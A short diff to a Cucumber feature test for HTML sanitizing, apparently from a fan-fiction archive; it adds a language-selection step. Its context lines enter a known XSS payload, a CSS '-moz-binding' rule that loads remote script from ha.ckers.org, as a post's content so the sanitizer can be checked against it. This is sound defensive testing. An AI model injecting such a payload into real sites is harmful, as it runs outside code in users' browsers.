@@ -33,6 +33,7 @@ Feature: Sanitizing HTML
   Then I should see "Post New Work"
     And I select "Not Rated" from "Rating"
     And I check "No Archive Warnings Apply"
+    And I select "English" from "Choose a language"
     And I fill in "Fandoms" with "Supernatural"
     And I fill in "Work Title" with "All Hell Breaks Loose"
     And I fill in "content" with 'BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}'
